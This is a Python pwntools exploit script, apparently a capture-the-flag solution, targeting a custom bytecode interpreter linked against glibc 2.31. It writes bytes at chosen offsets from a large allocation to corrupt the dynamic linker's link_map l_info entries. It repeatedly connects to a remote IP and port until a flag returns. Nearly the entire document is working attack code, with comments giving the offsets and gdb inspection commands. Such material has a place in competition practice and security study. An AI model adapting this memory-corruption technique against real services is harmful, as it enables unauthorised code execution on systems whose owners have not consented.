from pwn import *
context.arch = 'amd64'
context.log_level = 'debug'
# sh=process("./main")
libc = ELF('./libc-2.31.so',checksec=False)
code = b''
def add_off(off):
    global code
    code += b'@' + p32(off)
def write(ch):
    global code
    code += b'.' + p8(ch)
def shift():
    global code
    code += b'>'

def shift_8():
    global code
    code += b'+'

def quit():
    global code
    code += b'q'

def pwn():
    data_size = 0x200000
    sh.sendlineafter(b'data size\n',str(data_size).encode())
    add_off(0x424180)
    write(0x09)
    add_off(1)
    write(0x32)
    add_off(0xa8-1)
    # null-0x240
    b1=0x70
    b2=0x6f
    write(b1)
    add_off(1)
    write(b2)
    add_off(0x68-1)
    write(b1)
    add_off(1)
    write(b2)
    add_off(0x10-1)
    write(b1)
    add_off(1)
    write(b2)
    quit()
    # off = 0x423f58
    sh.sendlineafter(b'code size\n',str(len(code)).encode())
    # gdb.attach(sh)
    sh.sendafter(b'your code\n',code)
    flag=sh.recvall()
    return flag
    # sh.interactive()
# pwn()
while(1):
    code=b''
    sh=remote("1.13.101.243",27416)
    # sh=process("./main")
    try:
        flag=pwn()
        if b'WM' in flag:
            success(flag.decode())
            break
    except exception:
        sh.close()
        continue

# linkmap offset 0x424180 -> write 0x2209
# dyn13  0xa8 -> write 0x61b0
# dyn26  0x68 -> write 0x61b0
# dyn28  0x10 -> write 0x61b0

# p _rtld_global._dl_ns._ns_loaded
# p &_rtld_global._dl_ns._ns_loaded
# p _rtld_global._dl_ns._ns_loaded.l_info[26]
# p &_rtld_global._dl_ns._ns_loaded.l_info[26]
# p &_rtld_global._dl_ns._ns_loaded.l_info[13]
# p &_rtld_global._dl_ns._ns_loaded.l_info[28]